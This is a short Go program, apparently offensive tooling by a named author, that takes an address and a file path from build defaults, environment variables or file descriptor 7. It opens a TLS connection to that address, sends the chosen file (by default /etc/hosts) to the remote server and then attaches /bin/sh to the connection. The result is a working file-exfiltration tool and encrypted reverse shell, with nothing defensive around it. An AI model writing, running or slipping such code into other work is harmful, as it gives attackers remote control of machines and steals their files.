// Program comms_over_tls - argv_from_file_descriptor but uses TLS
package main

/*
 * comms_over_tls.go
 * argv_from_file_descriptor, but with TLS comms
 * By J. Stuart McMurray
 * Created 20240905
 * Last Modified 20240906
 */

import (
	"cmp"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
)

// Compile-time configurables
var (
	Address       = "localhost:4444"
	AddressEnvVar = "ALPT4ATS_ADDRESS"
	File          = "/etc/hosts"
	FileEnvVar    = "ALPT4ATS_FILE"
)

// ConfFD is the file descriptor from which we might read our config.
const ConfFD = 7

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
	File = cmp.Or(os.Getenv(FileEnvVar), File)

	/* Config from file descriptor 7 overrides config from environment. */
	if _, err := fmt.Fscan(
		os.NewFile(uintptr(ConfFD), "config"),
		&Address,
		&File,
	); nil != err && !errors.Is(err, io.EOF) &&
		!errors.Is(err, syscall.EBADF) {
		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
	}

	/* Connect to the server. */
	c, err := tls.Dial("tcp", Address, nil)
	if nil != err {
		log.Fatalf("Error connecting to server: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
